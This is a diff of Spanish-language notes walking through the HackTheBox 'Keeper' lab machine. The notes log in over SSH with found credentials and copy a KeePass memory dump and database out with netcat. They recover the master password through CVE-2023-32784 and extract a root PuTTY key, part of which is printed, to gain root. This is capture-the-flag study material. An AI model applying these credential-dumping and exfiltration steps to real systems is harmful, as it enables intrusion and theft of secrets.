@@ -1,4 +1,4 @@
-#easy #linux #nmap #ping
+#easy #linux #nmap #ping #keepass #kpcli #cd #ls #tratamientssy #unzip #ssh #CVE-2023-32784 #nc #puttygen 
 
 -------
 # Guided Mode
@@ -90,7 +90,7 @@ Y como vemos en el comentario, nos da la contraseña Welcome2023!
 ```
 ssh lnorgaard@10.10.11.227 -p 22
 ```
-*Credenciales:* Inogaard:Welcome2023!
+*Credenciales:* lnorgaard:Welcome2023!
 ![[Keeper12.png]]
 Ya estamos dentro de la maquina
 
@@ -98,36 +98,79 @@ Ya estamos dentro de la maquina
 # [[Tratamiento de la TTY]]
 
 ------
+# [[unzip]] y nos pasamos los archivos a nuestra maquina con [[Netcat]]
+
+En el escritorio del usuario *Inogaard* Encontramos un archivo *RT30000.zip* asi que lo vamos a descomprimir con [[unzip]] usando el comando `unzip RT30000.zip`
+
+![[Imagenes/Keeper13.png]]
+
+
+Ahora nos vamos a pasar los archivos a nuestra maquina, asi que nos ponemos en escucha con [[Netcat]] desde la maquina victima
+
+```shell
+nc -nlvp 5000 < KeePassDumpFull.dmp
+nc -nlvp 5000 < passcodes.kdbx
+```
+
+![[Keeper17.png]]
+
+Y desde nuestra maquina vamos a entablar la conexion
+```shell
+nc 10.10.11.227 5000 > KeePassDumpFull.dmp
+nc 10.10.11.227 5000 > passcodes.kdbx
+```
+Aclaracion: Despues de unos segundos hay que cortar la conexion con CTRL + C, por que si no queda activa
+
+![[Keeper16.png]]
+
+Ya tenemos los archivos en nuestra maquina
+
+--------
 # [[CVE-2023-32784]]
 
-En el escritorio del usuario *Inogaard* Encontramos un archivo *RT30000.zip* asi que lo vamos a descomprimir con [[unzip]] usando el comando `unzip RT30000_fixed.zip`
+[Proyecto keepass_dump](https://github.com/z-jxy/keepass_dump) 
+Vamos a clonar el proyecto con [[git clone]] usando el comando ``git clone https://github.com/z-jxy/keepass_dump``
+![[Keeper18.png]]
 
-![[Keeper13.png]]
+Ahora vamos a mover el archivo *KeePassDumpFull.dmp* a la carpeta del proyecto con [[mv]] usando el comando ``mv ~/Desktop/Keeper/content/KeePassDumpFull.dmp .``
 
-Como vemos un archivo 
-Ahora vamos a llevar los archivos a nuestra maquina
-con el comando de nc
+Ejecutamos el script
+```
+python3 keepass_dump.py -f KeePassDumpFull.dmp
+```
+
+![[Keeper19.png]]
+Y en este caso nos dumpea la contraseña con un caracter desconocido. *{UNKNOWN}dgrd med flde*
+
+Si buscamos esto en google nos va a aparecer
+![[Keeper20.png]]
+Como podemos ver podemos asumir que la contraseña es: *Rødgrød med Fløde*
+
+---------
+# Abrimos el archivo *passcodes.kdbx* con [[kpcli]]
 
 
+Vamos a ejecutar el comando
 
-
-
-apt install kpcli
-nos conectamos con 
-
-usamos este proyecto para dumpear la contraseña
-https://github.com/z-jxy/keepass_dump
-
-
+```shell
 kpcli --kdb passcodes.kdbx
-pusimos de contraseña    Rødgrød med Fløde
+```
+Y cuando nos pida contraseña vamos a ingresar *rødgrød med fløde*
 
-cd passcodes/
+Ahora con [[ls]] listamos los directorios, vemos la carpeta passcodes, entramos con [[cd]], listamos directorios nuevamente ,y vemos la carpeta Network, entramos y hay 2 archivos, listamos el contenido del primero  y vemos que nos da una clave ssh
+
+```shell
+ls
+cd passcodes
+ls
 cd Network
-	show 1 y show 2
-	y aca saqque un codigo ssh
+show 0
+```
 
-![[Keeper14.png]]
+![[Keeper21.png]]
+
+Podemos ver que dice ``uname: root`` y despues en las notas esta la clave ssh. Asi que asumimos que es del usuario *root*
+![[Imagenes/Keeper14.png]]
 
 
 ```
@@ -159,14 +202,28 @@ NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
 Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
 ```
 
+------
+# Conexion por [[puttygen]] y creacion de archivo id_rsa con 
+
+El contenido de la clave rsa que sacamos antes, lo vamos a poner en un archivo, que en este caso lo vamos a llamar ssh-rsa
+
+![[Keeper23.png]]
+
+Ahora vamos a usar [[puttygen]] para crear el archivo *id_rsa*
+```shell
+puttygen ssh-rsa -O private-openssh -o id_rsa
+```
+
+Y luego con [[ssh]] y el archivo de *id_rsa* que creamos antes nos vamos a conectar a la maquina. Y ya podemos catear las flags
+
+```shell
+ssh root@10.10.11.227 -i id_rsa
+```
+
+![[Keeper22.png]]
 
 
-
-
-
-
-
-
-
+-----
 # Creditos
 [Writeup de 0xdf](https://0xdf-gitlab-io.translate.goog/2024/02/10/htb-keeper.html?_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es#)
+Writeup oficial HackTheBox
